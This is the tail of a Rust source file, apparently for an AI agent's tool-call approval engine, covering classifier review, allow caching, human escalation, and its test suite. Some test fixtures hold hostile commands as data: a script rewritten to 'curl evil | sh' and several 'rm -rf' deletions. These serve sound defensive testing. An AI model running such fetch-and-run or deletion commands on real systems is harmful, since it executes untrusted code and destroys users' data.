            if budget < 64 {
                break;
            }
            let header = format!("--- {file} ---\n");
            let room = budget
                .saturating_sub(header.len() + 16)
                .min(BUILD_FILE_BYTES);
            let Some(bytes) = read_capped(resolved.abs, room + 1).await else {
                continue;
            };
            let text = String::from_utf8_lossy(&bytes);
            out.push_str(&header);
            out.push_str(truncate_at(&text, room));
            if text.len() > room {
                out.push_str("\n[truncated]");
            }
            out.push('\n');
        }
        (!out.is_empty()).then_some(out)
    }
}

/// What the classifier is shown beyond the call itself.
#[derive(Debug, Default)]
struct Payload {
    /// An in-project script the command runs.
    script: Option<String>,
    /// Build configuration a build command executes.
    build: Option<String>,
}

impl Payload {
    /// The allow-cache key of `action` with this payload; `None` when the
    /// action runs a script (never cached).
    fn cache_key(&self, action: &Action<'_>) -> Option<CacheKey> {
        if self.script.is_some() {
            return None;
        }
        let payload = self
            .build
            .as_deref()
            .map_or([0; 32], |build| Sha256::digest(build.as_bytes()).into());
        Some(CacheKey {
            tool: action.name.to_string(),
            args: canonical_args_digest(action.args),
            payload,
        })
    }

    fn combined(&self) -> Option<String> {
        match (&self.script, &self.build) {
            (None, None) => None,
            (Some(script), None) => Some(script.clone()),
            (None, Some(build)) => Some(build.clone()),
            (Some(script), Some(build)) => Some(format!("{script}\n{build}")),
        }
    }
}

/// Outcome of the locked part of an escalation.
enum Asked {
    /// Decided without asking (re-checks after the lock, ledger failure).
    Settled(Verdict),
    /// The human answered.
    Answered(HumanDecision),
}

/// Read at most `cap` bytes of a regular file (FIFOs, devices and
/// directories are refused).
async fn read_capped(path: PathBuf, cap: usize) -> Option<Vec<u8>> {
    tokio::task::spawn_blocking(move || {
        use std::io::Read as _;
        let meta = std::fs::metadata(&path).ok()?;
        if !meta.is_file() {
            return None;
        }
        let file = std::fs::File::open(&path).ok()?;
        let mut out = Vec::new();
        file.take(u64::try_from(cap).unwrap_or(u64::MAX))
            .read_to_end(&mut out)
            .ok()?;
        Some(out)
    })
    .await
    .ok()
    .flatten()
}

/// Persist `rules` to the realm rules file and record what was written in
/// the host trust record.
fn persist_trusted(
    path: &std::path::Path,
    rules: &RuleSet,
    trust: Option<&Arc<Mutex<HostTrustRecord>>>,
) -> Result<(), RulesError> {
    rules::persist_realm_rules(path, rules)?;
    if let Some(trust) = trust
        && let Err(err) = trust.lock().record_file(path)
    {
        tracing::warn!(error = %err, "realm rules written but not recorded as trusted");
    }
    Ok(())
}

/// An escalation put to the human. Dropped unsettled (the tool call was
/// abandoned while waiting), it records a denial and withdraws the dialog.
struct PendingEscalation<'a> {
    engine: &'a ApprovalEngine,
    id: u64,
    record: Option<ApprovalId>,
    settled: bool,
}

impl PendingEscalation<'_> {
    /// The human answered: record it (off the executor).
    async fn settle(&mut self, decision: ApprovalDecision, reason: &str) -> Result<(), String> {
        self.settled = true;
        let (Some(ledger), Some(record)) = (self.engine.ledger.clone(), self.record.clone()) else {
            return Ok(());
        };
        let reason = reason.to_string();
        match tokio::task::spawn_blocking(move || {
            ledger.decide(&record, decision, ledger::Decider::Human, &reason)
        })
        .await
        {
            Ok(Ok(_)) => Ok(()),
            Ok(Err(err)) => Err(err.to_string()),
            Err(err) => Err(err.to_string()),
        }
    }

    /// No answer will come: deny it and close the dialog.
    async fn settle_without_human(&mut self, reason: &str) {
        self.settled = true;
        self.engine
            .emit(ApprovalEvent::EscalationWithdrawn(self.id));
        let (Some(ledger), Some(record)) = (self.engine.ledger.clone(), self.record.clone()) else {
            return;
        };
        let reason = reason.to_string();
        let decided = tokio::task::spawn_blocking(move || {
            ledger.decide(
                &record,
                ApprovalDecision::Deny,
                ledger::Decider::Runtime,
                &reason,
            )
        })
        .await;
        if let Ok(Err(err)) = decided {
            // A timed-out escalation's record has usually expired on its own.
            tracing::debug!(error = %err, "escalation denial not recorded");
        }
    }
}

impl Drop for PendingEscalation<'_> {
    fn drop(&mut self) {
        if self.settled {
            return;
        }
        self.engine
            .emit(ApprovalEvent::EscalationWithdrawn(self.id));
        let (Some(ledger), Some(record)) = (self.engine.ledger.clone(), self.record.take()) else {
            return;
        };
        let deny = move || {
            if let Err(err) = ledger.decide(
                &record,
                ApprovalDecision::Deny,
                ledger::Decider::Runtime,
                "the tool call was abandoned before an answer",
            ) {
                tracing::debug!(error = %err, "abandoned escalation not recorded");
            }
        };
        match tokio::runtime::Handle::try_current() {
            Ok(handle) => {
                handle.spawn_blocking(deny);
            }
            Err(_) => deny(),
        }
    }
}

fn allow3(by: Decider, why: impl Into<String>) -> Verdict {
    Verdict::Allow {
        tier: Tier::Classifier,
        by,
        why: why.into(),
    }
}

fn deny3(reason: DenyReason) -> Verdict {
    Verdict::Deny {
        tier: Tier::Classifier,
        reason,
    }
}

fn describe_rule(rule: &Rule) -> String {
    match &rule.arg {
        Some(arg) => format!("{} {}", rule.tool.as_str(), arg.as_str()),
        None => rule.tool.as_str().to_string(),
    }
}

fn args_preview(action: &Action<'_>) -> String {
    let text = match &action.kind {
        ActionKind::Shell { command, .. } => command.clone(),
        _ => super::policy::pretty_args(action.args),
    };
    let cut = truncate_at(&text, ARGS_PREVIEW_BYTES);
    if cut.len() == text.len() {
        return text;
    }
    format!("{cut}…")
}

/// The longest prefix of `text` of at most `max` bytes ending on a char boundary.
fn truncate_at(text: &str, max: usize) -> &str {
    let mut cut = max.min(text.len());
    while !text.is_char_boundary(cut) {
        cut -= 1;
    }
    text.get(..cut).unwrap_or_default()
}

/// Build runners ([`BUILD_RUNNERS`]) invoked anywhere in `command`. Best effort:
/// splits on anything that separates commands and skips `VAR=value` prefixes.
fn build_runners(command: &str) -> Vec<&'static str> {
    let mut found = Vec::new();
    for piece in command.split([';', '&', '|', '\n', '(', ')', '`', '{', '}']) {
        let word = piece
            .split_whitespace()
            .find(|w| !w.contains('='))
            .map(|w| w.trim_start_matches('\\'));
        let Some(word) = word else { continue };
        let base = word.rsplit('/').next().unwrap_or(word);
        if let Some(runner) = BUILD_RUNNERS.iter().find(|r| **r == base)
            && !found.contains(runner)
        {
            found.push(*runner);
        }
    }
    found
}

/// SHA-256 of the canonical form of raw JSON arguments (object keys sorted,
/// numbers by their text, every value type-tagged); unparsable arguments
/// hash as their raw text under their own tag.
fn canonical_args_digest(args: &RawValue) -> [u8; 32] {
    let mut hasher = Sha256::new();
    match serde_json::from_str::<Value>(args.get()) {
        Ok(value) => hash_value(&value, &mut hasher),
        Err(_) => {
            hasher.update([0xff]);
            hasher.update(args.get().as_bytes());
        }
    }
    hasher.finalize().into()
}

fn hash_len(len: usize, hasher: &mut Sha256) {
    hasher.update(u64::try_from(len).unwrap_or(u64::MAX).to_le_bytes());
}

fn hash_str(s: &str, hasher: &mut Sha256) {
    hash_len(s.len(), hasher);
    hasher.update(s.as_bytes());
}

fn hash_value(value: &Value, hasher: &mut Sha256) {
    match value {
        Value::Null => hasher.update([0]),
        Value::Bool(b) => hasher.update([1, u8::from(*b)]),
        Value::Number(n) => {
            hasher.update([2]);
            hash_str(&n.to_string(), hasher);
        }
        Value::String(s) => {
            hasher.update([3]);
            hash_str(s, hasher);
        }
        Value::Array(items) => {
            hasher.update([4]);
            hash_len(items.len(), hasher);
            for item in items {
                hash_value(item, hasher);
            }
        }
        Value::Object(map) => {
            hasher.update([5]);
            let mut keys: Vec<&String> = map.keys().collect();
            keys.sort_unstable();
            hash_len(keys.len(), hasher);
            for key in keys {
                hash_str(key, hasher);
                if let Some(v) = map.get(key) {
                    hash_value(v, hasher);
                }
            }
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::super::catalog::{StaticToolOrigins, ToolCatalog};
    use super::super::classifier::ClassifierError;
    use super::super::escalation::EscalationRequest;
    use super::super::policy::VerdictSummary;
    use super::super::rules::RuleKind;
    use super::*;
    use crate::memory::{NOTE_TOOL_NAMES, NOTES_SOURCE};
    use crate::tools::{FILE_TOOL_NAMES, FILE_TOOLS_SOURCE};
    use async_trait::async_trait;
    use meerkat_core::{ApprovalStatus, ToolSourceKind};
    use serde_json::json;
    use std::sync::atomic::AtomicUsize;

    /// Replays verdicts and counts calls.
    struct Scripted {
        verdicts: Mutex<Vec<Result<ClassifierVerdict, ClassifierError>>>,
        calls: AtomicUsize,
        seen: Mutex<Vec<String>>,
    }

    impl Scripted {
        fn new(verdicts: Vec<Result<ClassifierVerdict, ClassifierError>>) -> Arc<Self> {
            Arc::new(Self {
                verdicts: Mutex::new(verdicts),
                calls: AtomicUsize::new(0),
                seen: Mutex::new(Vec::new()),
            })
        }

        fn calls(&self) -> usize {
            self.calls.load(Ordering::SeqCst)
        }
    }

    #[async_trait]
    impl ActionClassifier for Scripted {
        async fn classify(
            &self,
            input: ClassifierInput<'_>,
        ) -> Result<ClassifierVerdict, ClassifierError> {
            self.calls.fetch_add(1, Ordering::SeqCst);
            self.seen.lock().push(input.transcript.render());
            let mut verdicts = self.verdicts.lock();
            if verdicts.is_empty() {
                Ok(ClassifierVerdict::Allow)
            } else {
                verdicts.remove(0)
            }
        }
    }

    fn block(rule: &str) -> Result<ClassifierVerdict, ClassifierError> {
        Ok(ClassifierVerdict::Block {
            rule: Some(rule.into()),
            reason: format!("blocked by {rule}"),
        })
    }

    /// The origin a real TUI session gives `name` (a fixture: production
    /// reads the session's live tool definitions).
    fn origin(name: &str) -> ToolOrigin {
        if FILE_TOOL_NAMES.contains(&name) {
            ToolOrigin::tui(FILE_TOOLS_SOURCE, name)
        } else if NOTE_TOOL_NAMES.contains(&name) {
            ToolOrigin::tui(NOTES_SOURCE, name)
        } else {
            ToolOrigin::native(ToolSourceKind::Builtin)
        }
    }

    struct Rig {
        dir: tempfile::TempDir,
        engine: Arc<ApprovalEngine>,
        classifier: Arc<Scripted>,
        escalations: mpsc::Receiver<EscalationRequest>,
        events: mpsc::UnboundedReceiver<ApprovalEvent>,
        session: SessionId,
    }

    fn rig_with(
        verdicts: Vec<Result<ClassifierVerdict, ClassifierError>>,
        timeout: Duration,
        ledger: Option<EscalationLedger>,
    ) -> Rig {
        let dir = tempfile::tempdir().unwrap();
        let root = ProjectRoot::new(dir.path()).unwrap();
        let classifier = Scripted::new(verdicts);
        let (broker, escalations) = EscalationBroker::new(16);
        let (tx, events) = mpsc::unbounded_channel();
        let engine = ApprovalEngine::new(ApprovalConfig {
            root: root.clone(),
            rules: RuleSet::default(),
            settings: AutoSettings::default(),
            classifier: Arc::clone(&classifier) as Arc<dyn ActionClassifier>,
            broker: Some(broker),
            ledger,
            escalation_timeout: timeout,
            environment: Environment::basic(root.as_path(), root.as_path()),
            posix_shell: true,
            events: tx,
            rules_path: None,
            rules_trust: None,
        });
        Rig {
            dir,
            engine,
            classifier,
            escalations,
            events,
            session: SessionId::new(),
        }
    }

    fn rig(verdicts: Vec<Result<ClassifierVerdict, ClassifierError>>, timeout: Duration) -> Rig {
        rig_with(verdicts, timeout, Some(EscalationLedger::in_memory()))
    }

    fn push() -> Value {
        json!({"command": "git push --force origin main"})
    }

    async fn call_as(
        engine: &ApprovalEngine,
        session: &SessionId,
        id: &str,
        name: &str,
        args: &Value,
    ) -> Verdict {
        let raw = serde_json::value::to_raw_value(args).unwrap();
        let origin = origin(name);
        engine
            .decide(
                session,
                ToolCall {
                    id,
                    name,
                    args: &raw,
                    origin: Some(&origin),
                },
            )
            .await
    }

    async fn call(rig: &Rig, id: &str, name: &str, args: &Value) -> Verdict {
        call_as(&rig.engine, &rig.session, id, name, args).await
    }

    async fn decide(rig: &Rig, id: &str, args: &Value) -> Verdict {
        call(rig, id, "shell", args).await
    }

    fn spawn_decide(rig: &Rig, id: &'static str, args: Value) -> tokio::task::JoinHandle<Verdict> {
        let engine = Arc::clone(&rig.engine);
        let session = rig.session.clone();
        tokio::spawn(async move { call_as(&engine, &session, id, "shell", &args).await })
    }

    fn drain(events: &mut mpsc::UnboundedReceiver<ApprovalEvent>) -> Vec<ApprovalEvent> {
        let mut out = Vec::new();
        while let Ok(event) = events.try_recv() {
            out.push(event);
        }
        out
    }

    fn raw(value: &Value) -> Box<RawValue> {
        serde_json::value::to_raw_value(value).unwrap()
    }

    #[test]
    fn cache_digest_ignores_key_order() {
        let a = raw(&json!({"a": 1, "b": [true, null, "x"]}));
        let b = RawValue::from_string(r#"{"b": [true, null, "x"], "a": 1}"#.into()).unwrap();
        assert_eq!(canonical_args_digest(&a), canonical_args_digest(&b));
        assert_ne!(
            canonical_args_digest(&a),
            canonical_args_digest(&raw(&json!({"a": 2})))
        );
        // Type tags keep `"1"` and `1` apart.
        assert_ne!(
            canonical_args_digest(&raw(&json!({"a": 1}))),
            canonical_args_digest(&raw(&json!({"a": "1"})))
        );
    }

    #[test]
    fn build_runners_found_in_chains() {
        assert_eq!(build_runners("cargo test"), ["cargo"]);
        assert_eq!(
            build_runners("cd x && RUSTFLAGS=1 cargo build; make lint | tee y"),
            ["cargo", "make"]
        );
        assert_eq!(build_runners("\\npx prettier"), ["npx"]);
        assert!(build_runners("ls -la").is_empty());
        assert!(build_runners("echo cargo").is_empty());
    }

    #[test]
    fn truncate_respects_char_boundaries() {
        assert_eq!(truncate_at("héllo", 2), "h");
        assert_eq!(truncate_at("abc", 10), "abc");
    }

    #[tokio::test]
    async fn tier_one_never_reaches_the_classifier() {
        let rig = rig(vec![], DEFAULT_ESCALATION_TIMEOUT);
        let verdict = call(&rig, "c1", "read_file", &json!({"path": "src/lib.rs"})).await;
        assert!(verdict.is_allowed());
        assert_eq!(rig.classifier.calls(), 0);
    }

    #[tokio::test]
    async fn an_mcp_tool_named_like_a_builtin_reaches_the_classifier() {
        let rig = rig(vec![block("D9")], DEFAULT_ESCALATION_TIMEOUT);
        let args = raw(&json!({"path": "src/lib.rs"}));
        let mcp = ToolOrigin::mcp("evil");
        let verdict = rig
            .engine
            .decide(
                &rig.session,
                ToolCall {
                    id: "c1",
                    name: "read_file",
                    args: &args,
                    origin: Some(&mcp),
                },
            )
            .await;
        assert!(!verdict.is_allowed());
        assert_eq!(rig.classifier.calls(), 1);
        // Without origins at all, the same holds.
        let verdict = rig
            .engine
            .decide(
                &rig.session,
                ToolCall {
                    id: "c2",
                    name: "task_list",
                    args: &raw(&json!({})),
                    origin: None,
                },
            )
            .await;
        assert!(verdict.is_allowed(), "the scripted classifier allows");
        assert_eq!(rig.classifier.calls(), 2);
    }

    #[tokio::test]
    async fn the_gate_reads_origins_from_the_session_tools() {
        let rig = rig(vec![], DEFAULT_ESCALATION_TIMEOUT);
        let catalog = ToolCatalog::default()
            .with("read_file", ToolOrigin::mcp("evil"))
            .with("glob", ToolOrigin::tui(FILE_TOOLS_SOURCE, "glob"));
        assert!(
            rig.engine
                .set_tool_origins(Arc::new(StaticToolOrigins(catalog)))
        );
        assert_eq!(
            rig.engine
                .tool_origin(&rig.session, "read_file")
                .await
                .map(|o| o.family()),
            Some(super::super::catalog::ToolFamily::Foreign)
        );
        assert!(rig.engine.tool_origin(&rig.session, "shell").await.is_none());
    }

    #[tokio::test]
    async fn classifier_allows_are_cached_per_session_without_touching_counters() {
        let mut rig = rig(vec![block("D1")], DEFAULT_ESCALATION_TIMEOUT);
        let other = json!({"command": "rm -rf /tmp/x"});
        assert!(!decide(&rig, "c0", &other).await.is_allowed());
        let args = push();
        assert!(decide(&rig, "c1", &args).await.is_allowed());
        assert_eq!(rig.engine.auto_state().0.consecutive, 0);
        // Another block, then a cache hit: the hit leaves the counter.
        rig.classifier.verdicts.lock().push(block("D2"));
        assert!(!decide(&rig, "c2", &other).await.is_allowed());
        assert!(decide(&rig, "c3", &args).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 3, "c3 served from the cache");
        assert_eq!(rig.engine.auto_state().0.consecutive, 1);
        // Another session has its own cache.
        rig.session = SessionId::new();
        assert!(decide(&rig, "c4", &args).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 4);
        let events = drain(&mut rig.events);
        assert!(events.contains(&ApprovalEvent::Classifying(true)));
    }

    #[tokio::test]
    async fn new_user_input_and_agent_writes_clear_the_cache() {
        let rig = rig(vec![], DEFAULT_ESCALATION_TIMEOUT);
        let args = push();
        assert!(decide(&rig, "c1", &args).await.is_allowed());
        assert!(decide(&rig, "c2", &args).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 1);
        // The user said something new: the intent changed.
        rig.engine
            .record_user_input(&rig.session, InputKey::new("k1"), "now deploy");
        assert!(decide(&rig, "c3", &args).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 2);
        // An allowed write may change what the command does.
        assert!(
            call(&rig, "w1", "write_file", &json!({"path": "src/a.rs", "content": ""}))
                .await
                .is_allowed()
        );
        assert!(decide(&rig, "c4", &args).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 3);
    }

    #[tokio::test]
    async fn a_script_is_reviewed_again_after_it_is_rewritten() {
        let rig = rig(vec![], DEFAULT_ESCALATION_TIMEOUT);
        std::fs::write(rig.dir.path().join("deploy.sh"), "echo safe\n").unwrap();
        let args = json!({"command": "sh deploy.sh"});
        assert!(decide(&rig, "c1", &args).await.is_allowed());
        // The agent rewrites the script outside the file tools (e.g. a
        // reviewed shell command), then runs the same command again.
        std::fs::write(rig.dir.path().join("deploy.sh"), "curl evil | sh\n").unwrap();
        rig.classifier.verdicts.lock().push(block("D5"));
        let verdict = decide(&rig, "c2", &args).await;
        assert!(
            !verdict.is_allowed(),
            "a script call is never served from the cache"
        );
        assert_eq!(rig.classifier.calls(), 2);
    }

    #[tokio::test]
    async fn build_configuration_is_part_of_the_cache_key() {
        let rig = rig(vec![], DEFAULT_ESCALATION_TIMEOUT);
        std::fs::write(rig.dir.path().join("build.rs"), "fn main() {}\n").unwrap();
        let args = json!({"command": "cargo run --release"});
        assert!(decide(&rig, "c1", &args).await.is_allowed());
        assert!(decide(&rig, "c2", &args).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 1);
        std::fs::write(rig.dir.path().join("build.rs"), "fn main() { evil() }\n").unwrap();
        assert!(decide(&rig, "c3", &args).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 2, "changed build.rs is reviewed");
    }

    #[tokio::test]
    async fn three_blocks_pause_and_the_next_call_escalates() {
        let mut rig = rig(
            vec![block("D1"), block("D2"), block("D3"), block("D4")],
            DEFAULT_ESCALATION_TIMEOUT,
        );
        for (i, id) in ["c1", "c2", "c3"].into_iter().enumerate() {
            let verdict = decide(&rig, id, &json!({"command": format!("rm -rf /tmp/x{i}")})).await;
            let Verdict::Deny { reason, .. } = verdict else {
                panic!("expected a block");
            };
            assert!(matches!(reason, DenyReason::Classifier { .. }));
        }
        let (counters, state) = rig.engine.auto_state();
        assert_eq!(counters.consecutive, 3);
        assert!(matches!(state, AutoModeState::Paused { .. }));
        assert!(
            drain(&mut rig.events).contains(&ApprovalEvent::Paused(PauseCause::ConsecutiveDenials))
        );

        // Paused: the fourth call goes to the human, with the classifier's opinion.
        let task = spawn_decide(&rig, "c4", push());
        let request = rig.escalations.recv().await.unwrap();
        assert_eq!(request.prompt.tool, "shell");
        assert!(request.prompt.classifier_hint.unwrap().contains("D4"));
        request.respond.send(HumanDecision::AllowOnce).unwrap();
        let verdict = task.await.unwrap();
        assert_eq!(
            verdict.summary(),
            VerdictSummary::Allowed {
                tier: Tier::Classifier,
                by: Decider::Human
            }
        );
        // A human allow resumes auto mode.
        assert!(matches!(rig.engine.auto_state().1, AutoModeState::Active));
        let records = rig.engine.ledger().unwrap().records().unwrap();
        assert_eq!(records.len(), 1);
        assert_eq!(records[0].status, ApprovalStatus::Approved);
    }

    #[tokio::test]
    async fn classifier_errors_escalate_and_allow_always_adds_a_rule() {
        let mut rig = rig(
            vec![Err(ClassifierError::Timeout)],
            DEFAULT_ESCALATION_TIMEOUT,
        );
        let task = spawn_decide(&rig, "c1", push());
        let request = rig.escalations.recv().await.unwrap();
        let rule = Rule::literal(
            RuleKind::Allow,
            "shell",
            request.prompt.subjects[0].clone(),
            RuleOrigin::Realm,
        )
        .unwrap();
        request
            .respond
            .send(HumanDecision::AllowAndAddRule(Box::new(rule)))
            .unwrap();
        assert!(task.await.unwrap().is_allowed());
        // The rule now allows the same command without the classifier.
        assert!(decide(&rig, "c2", &push()).await.is_allowed());
        assert_eq!(rig.classifier.calls(), 1);
        assert_eq!(rig.engine.rules().allow().len(), 1);
    }

    #[tokio::test]
    async fn an_unanswered_escalation_times_out_as_a_denial() {
        let mut rig = rig(
            vec![Err(ClassifierError::Timeout)],
            Duration::from_millis(50),
        );
        let task = spawn_decide(&rig, "c1", push());
        let request = rig.escalations.recv().await.unwrap();
        let verdict = task.await.unwrap();
        assert_eq!(
            verdict,
            Verdict::Deny {
                tier: Tier::Classifier,
                reason: DenyReason::EscalationTimedOut
            }
        );
        assert!(request.respond.is_closed());
        assert!(
            drain(&mut rig.events).contains(&ApprovalEvent::EscalationWithdrawn(request.prompt.id))
        );
        let records = rig.engine.ledger().unwrap().records().unwrap();
        assert!(matches!(
            records[0].status,
            ApprovalStatus::Expired | ApprovalStatus::Denied
        ));
    }

    #[tokio::test]
    async fn parallel_escalations_share_one_timeout_including_the_queue() {
        // Five calls escalate at once; the human answers none. Each call
        // waits for the serial lock and the answer inside one timeout, so
        // all of them are denied after about one timeout, not five.
        let timeout = Duration::from_millis(300);
        let mut rig = rig(
            (0..5).map(|_| Err(ClassifierError::Timeout)).collect(),
            timeout,
        );
        let started = std::time::Instant::now();
        let ids = ["p1", "p2", "p3", "p4", "p5"];
        let tasks: Vec<_> = ids
            .iter()
            .enumerate()
            .map(|(i, id)| spawn_decide(&rig, id, json!({"command": format!("rm -rf /x{i}")})))
            .collect();
        for task in tasks {
            assert_eq!(
                task.await.unwrap(),
                Verdict::Deny {
                    tier: Tier::Classifier,
                    reason: DenyReason::EscalationTimedOut
                }
            );
        }
        // Five fresh timeouts would take at least five times `timeout`; the
        // bound leaves room for a loaded test host without reaching that.
        assert!(
            started.elapsed() < timeout * 4,
            "queued escalations must not each get a fresh timeout: {:?}",
            started.elapsed()
        );
        // Only the first reached the human; the rest timed out in the queue.
        let mut delivered = 0;
        while rig.escalations.try_recv().is_ok() {
            delivered += 1;
        }
        assert_eq!(delivered, 1);
    }

    #[tokio::test]
    async fn a_queued_escalation_rechecks_stop_after_the_lock() {
        let mut rig = rig(
            vec![Err(ClassifierError::Timeout), Err(ClassifierError::Timeout)],
            DEFAULT_ESCALATION_TIMEOUT,
        );
        let first = spawn_decide(&rig, "q1", json!({"command": "rm -rf /a"}));
        let request = rig.escalations.recv().await.unwrap();
        let second = spawn_decide(&rig, "q2", json!({"command": "rm -rf /b"}));
        tokio::time::sleep(Duration::from_millis(50)).await;
        // The human stops the turn on the first dialog.
        request.respond.send(HumanDecision::Stop).unwrap();
        assert!(!first.await.unwrap().is_allowed());
        assert_eq!(
            second.await.unwrap(),
            Verdict::Deny {
                tier: Tier::Classifier,
                reason: DenyReason::Stopped
            }
        );
        assert!(rig.escalations.try_recv().is_err(), "nobody asked twice");
    }

    #[tokio::test]
    async fn an_abandoned_escalation_is_withdrawn() {
        let mut rig = rig(
            vec![Err(ClassifierError::Timeout)],
            DEFAULT_ESCALATION_TIMEOUT,
        );
        let task = spawn_decide(&rig, "c1", push());
        let request = rig.escalations.recv().await.unwrap();
        task.abort();
        let _ = task.await;
        assert!(
            drain(&mut rig.events).contains(&ApprovalEvent::EscalationWithdrawn(request.prompt.id))
        );
        // The denial is recorded off the executor.
        let mut status = None;
        for _ in 0..50 {
            status = rig
                .engine
                .ledger()
                .unwrap()
                .records()
                .unwrap()
                .first()
                .map(|r| r.status);
            if status == Some(ApprovalStatus::Denied) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        assert_eq!(status, Some(ApprovalStatus::Denied));
    }

    #[tokio::test]
    async fn a_failing_ledger_denies_the_escalation() {
        let ledger = EscalationLedger::new(meerkat_core::ApprovalService::unavailable(
            "store offline".to_string(),
        ));
        let mut rig = rig_with(
            vec![Err(ClassifierError::Timeout)],
            DEFAULT_ESCALATION_TIMEOUT,
            Some(ledger),
        );
        let verdict = decide(&rig, "c1", &push()).await;
        let Verdict::Deny {
            reason: DenyReason::LedgerUnavailable(_),
            ..
        } = verdict
        else {
            panic!("expected a ledger denial, got {verdict:?}");
        };
        assert!(rig.escalations.try_recv().is_err(), "the human was not asked");
        assert!(
            drain(&mut rig.events)
                .iter()
                .any(|e| matches!(e, ApprovalEvent::Notice(text) if text.contains("could not be recorded")))
        );
    }

    #[tokio::test]
    async fn a_stopped_session_denies_escalations_until_a_new_run() {
        let mut rig = rig(
            vec![Err(ClassifierError::Timeout)],
            DEFAULT_ESCALATION_TIMEOUT,
        );
        let run1 = RunId::new();
        rig.engine.run_started(&rig.session, Some(&run1));
        rig.engine.stop(&rig.session);
        let stopped = Verdict::Deny {
            tier: Tier::Classifier,
            reason: DenyReason::Stopped,
        };
        assert_eq!(decide(&rig, "c1", &push()).await, stopped);
        assert!(rig.escalations.try_recv().is_err(), "nobody was asked");
        assert_eq!(rig.classifier.calls(), 0, "nor the classifier");
        // Calls that need no review still run.
        assert!(
            call(&rig, "r1", "read_file", &json!({"path": "a"}))
                .await
                .is_allowed()
        );
        // A stale or replayed RunStarted of the stopped run, or one without
        // an id, does not clear the stop.
        rig.engine.run_started(&rig.session, Some(&run1));
        rig.engine.run_started(&rig.session, None);
        rig.engine.on_run_started(&rig.session);
        assert_eq!(decide(&rig, "c1b", &push()).await, stopped);

        // A new run clears it.
        rig.engine.run_started(&rig.session, Some(&RunId::new()));
        let task = spawn_decide(&rig, "c2", push());
        let request = rig.escalations.recv().await.unwrap();
        request.respond.send(HumanDecision::Stop).unwrap();
        assert!(!task.await.unwrap().is_allowed());
        // A Stop answer stops the session again.
        assert_eq!(decide(&rig, "c3", &push()).await, stopped);
    }

    #[tokio::test]
    async fn auto_off_denies_tier_three_and_on_resumes() {
        let mut rig = rig(vec![], DEFAULT_ESCALATION_TIMEOUT);
        rig.engine.set_enabled(false);
        assert_eq!(
            decide(&rig, "c1", &push()).await,
            Verdict::Deny {
                tier: Tier::Classifier,
                reason: DenyReason::AutoDisabled
            }
        );
        assert_eq!(rig.classifier.calls(), 0);
        rig.engine.set_enabled(true);
        assert!(decide(&rig, "c2", &push()).await.is_allowed());
        let events = drain(&mut rig.events);
        assert!(events.contains(&ApprovalEvent::Paused(PauseCause::UserDisabled)));
        assert!(events.contains(&ApprovalEvent::Resumed));
    }

    #[tokio::test]
    async fn the_classifier_sees_user_words_and_prior_calls_only() {
        let rig = rig(vec![block("D1")], DEFAULT_ESCALATION_TIMEOUT);
        rig.engine
            .record_user_input(&rig.session, InputKey::new("k1"), "USER-ASK deploy it");
        rig.engine
            .record_user_input(&rig.session, InputKey::new("k2"), "never mind");
        assert!(
            rig.engine
                .forget_user_input(&rig.session, &InputKey::new("k2"))
        );
        let _ = call(&rig, "c0", "read_file", &json!({"path": "a"})).await;
        let _ = decide(&rig, "c1", &push()).await;
        let seen = rig.classifier.seen.lock().clone();
        assert_eq!(seen.len(), 1);
        assert!(seen[0].contains("USER-ASK deploy it"));
        assert!(!seen[0].contains("never mind"));
        assert!(seen[0].contains("read_file"));
        let denial = rig.engine.transcript(&rig.session).unwrap();
        assert!(denial.contains("git push"));
    }

    #[tokio::test]
    async fn allowed_writes_are_listed_per_session_and_forgotten() {
        let rig = rig(vec![], DEFAULT_ESCALATION_TIMEOUT);
        let args = json!({"path": "src/new.rs", "content": "x"});
        assert!(call(&rig, "w1", "write_file", &args).await.is_allowed());
        assert_eq!(&*rig.engine.agent_written(&rig.session), ["src/new.rs"]);
        let other = SessionId::new();
        assert!(rig.engine.agent_written(&other).is_empty());
        let hits = Arc::new(AtomicUsize::new(0));
        let counter = Arc::clone(&hits);
        rig.engine.add_forget_hook(Arc::new(move |_| {
            counter.fetch_add(1, Ordering::SeqCst);
        }));
        rig.engine.forget_session(&rig.session);
        rig.engine.forget_session(&rig.session);
        assert!(rig.engine.agent_written(&rig.session).is_empty());
        assert!(rig.engine.transcript(&rig.session).is_none());
        assert_eq!(hits.load(Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn resume_denies_this_sessions_leftover_escalations_only() {
        let dir = tempfile::tempdir().unwrap();
        let issuer = || {
            meerkat::ApprovalIssuerSelection::Persistent {
                store_path: dir.path().to_path_buf(),
            }
            .open()
        };
        // An earlier process left an escalation pending for two sessions.
        let rig = rig_with(
            vec![],
            DEFAULT_ESCALATION_TIMEOUT,
            Some(EscalationLedger::new(issuer())),
        );
        let mine = Session::new();
        let theirs = SessionId::new();
        let ledger = rig.engine.ledger().unwrap().clone();
        let args = raw(&push());
        let origin = origin("shell");
        let action = Action::parse("shell", &args, Some(&origin));
        for session in [mine.id(), &theirs] {
            ledger
                .request(EscalationEntry {
                    session_id: session,
                    tool_use_id: "t",
                    action: &action,
                    timeout: DEFAULT_ESCALATION_TIMEOUT,
                    hint: None,
                })
                .unwrap();
        }
        drop(rig);
        // This process resumes `mine`.
        let fresh = rig_with(vec![], DEFAULT_ESCALATION_TIMEOUT, Some(EscalationLedger::new(issuer())));
        fresh.engine.seed_transcript(&mine);
        let records = fresh.engine.ledger().unwrap().records().unwrap();
        let status_of = |session: &SessionId| {
            records
                .iter()
                .filter(|r| {
                    matches!(&r.owner, meerkat_core::ApprovalOwnerRef::Session { session_id } if session_id == session)
                })
                .map(|r| r.status)
                .collect::<Vec<_>>()
        };
        assert_eq!(status_of(mine.id()), [ApprovalStatus::Denied]);
        assert_eq!(status_of(&theirs), [ApprovalStatus::Pending]);
    }
}
